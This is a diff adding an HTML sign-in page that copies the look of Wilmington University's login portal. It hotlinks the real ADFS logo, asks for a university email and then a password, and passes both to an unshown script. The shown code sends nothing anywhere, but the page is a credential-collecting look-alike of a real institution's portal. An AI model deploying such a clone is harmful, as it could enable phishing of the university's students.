@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-box" id="loginBox">
+        <div class="flip-card-inner">
+            <!-- Front Side (Email) -->
+            <div class="flip-card-front">
+                <div class="login-logo">
+                    <img src="https://fs.wilmu.edu/adfs/portal/logo/logo.png?id=9333C1FAF0B706C627799ECE9F7A7DD04BCD6E80B213C7D77C0F6B111593E673" alt="Logo" />
+                </div>
+                <div class="login-content">
+                    <p id="instructions">Sign in with your Wilmington University Email Address</p>
+                    <div class="input-container">
+                        <input type="text" id="emailInput" placeholder="Enter Email" oninput="validateEmail()" />
+                        <span>@my.wilmu.edu</span>
+                    </div>
+                    <div id="errorMessage"></div>
+                    <p>Need to reset your password? <span class="link">Click here</span></p>
+                    <p>Need to change your password? <span class="link">Click here</span></p>
+                    <button id="nextButton" onclick="submitEmail()">Next</button>
+                </div>
+            </div>
+
+            <!-- Back Side (Password) -->
+            <div class="flip-card-back">
+                <div class="login-logo">
+                    <img src="https://fs.wilmu.edu/adfs/portal/logo/logo.png?id=9333C1FAF0B706C627799ECE9F7A7DD04BCD6E80B213C7D77C0F6B111593E673" alt="Logo" />
+                </div>
+                <div class="login-content">
+                    <p id="instructionsBack">Enter your password</p>
+                    <div class="input-container">
+                        <input type="password" id="passwordInput" placeholder="Password" />
+                    </div>
+                    <p>Need to reset your password? <span class="link">Click here</span></p>
+                    <p>Need to change your password? <span class="link">Click here</span></p>
+                    <button id="enterButton" onclick="validatePassword()">Enter</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
